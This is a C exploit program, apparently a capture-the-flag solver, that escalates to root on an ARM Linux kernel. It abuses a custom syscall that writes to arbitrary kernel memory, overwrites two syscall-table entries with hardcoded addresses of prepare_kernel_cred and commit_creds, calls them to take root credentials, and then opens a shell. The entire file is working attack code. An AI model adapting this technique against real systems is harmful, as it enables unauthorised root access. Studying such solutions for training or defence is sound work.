//gcc -o solver solver.c -std=c99

#include <unistd.h>
#include <stdio.h>

#define SYS_CALL_TABLE 0x8000e348

#define PREPARE_KERNEL_CRED 0x8003f924
#define COMMIT_CREDS 0x8003f560 //0x8003f56c

#define SYS_EMPTY_A 188
#define SYS_EMPTY_B 189

int main() {
    unsigned int* sct = (unsigned int*)SYS_CALL_TABLE;

    char nop[] = "\x01\x10\x81\xe1";
    char buf[20];

    for (int i = 0; i < 12; i++) {
        buf[i] = nop[i % 4];
    }
    buf[12] = 0;

    syscall(223, buf, COMMIT_CREDS);
    puts("Stage 1 - add padding");

    syscall(223, "\x24\xf9\x03\x80", sct + SYS_EMPTY_A);
    syscall(223, "\x60\xf5\x03\x80", sct + SYS_EMPTY_B);
    puts("Stage 2 - overwrite syscall table");

    syscall(SYS_EMPTY_B, syscall(SYS_EMPTY_A, 0));
    puts("Stage 3 - set new cred");

    system("/bin/sh");

    return 0;
}
